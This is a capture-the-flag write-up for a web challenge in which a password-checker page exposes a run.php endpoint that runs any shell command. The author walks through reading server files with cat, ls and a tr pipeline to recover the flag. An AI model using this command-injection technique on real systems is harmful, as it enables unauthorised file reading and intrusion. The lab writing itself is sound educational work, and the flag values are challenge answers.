# Password checker (50 points, Web Security)
See if your password is secure! Or whether this portal is secure!

> After the announcement of a catastrophic breach of PICI (Personally Identifiable 
> Cat Information) by Evil Robot Corp, we used Shodan to see if there were any 
> interesting new attack vectors in their IP space and found this weird password 
> checker portal. It looks totally hackable. Can you see if you can exfiltrate 
> files out of the portal?
> 
> This challenge will be discussed at Capture the Flag: Learning to Hack for Fun
> and Profit at the 2017 Grace Hopper Celebration.
> 
> note: there's a minor bug and there are two flags but only one will work. 
> If your flag doesn't work, keep looking for the other one.
> 
> This URL is unique to your team! Don't share it with competitors!
> 
> https://rager-labuc-nubyg-nypot-direc.capturethesquare.com

Visiting the URL and looking at the source, we see an interesting
ajax call executed when we submit a password:

```js
function validate(objForm) {
  let toBeCheckedValue = objForm.elements['password'].value;

  let xmlHttp = new XMLHttpRequest();
  xmlHttp.open('GET', '/run.php?cmd=cat%20../password.txt', false);
  xmlHttp.send(null);
  let actualValue = xmlHttp.responseText;

  if (toBeCheckedValue != actualValue) {
    alert('Passwords don\'t match!');
  } else {
    alert('Password validated!');
  }
}
```

It seems to directly execute commands. However, the output seem to be limited to the
last line of the output of the command. For example, visiting `run.php?cmd=cat%20index.html`
we get the following response:

```
</html>
```

This also means simply listing all files in a directory is not as easy as running `ls`,
since this will only give us the last file in the directory:

`run.php?cmd=ls ../`:
```
xxx_not_a_flag.txt
```

However, with some clever guessing (cough), we find a flag.txt. Unfortunately it spans 2 rows:

`run.php?cmd=cat ../flag.txt`:
```
line 2: flap-31aac7e26de449ee
```

A quick google search later we find the `tr` command, which lets us join multiple lines
to one:

`run.php?cmd=cat ../flag.txt | tr '\n' ' '`
```
line 1: flag-bc0a804287546c09 line 2: flap-31aac7e26de449ee
```

Flag: `flag-bc0a804287546c09`.
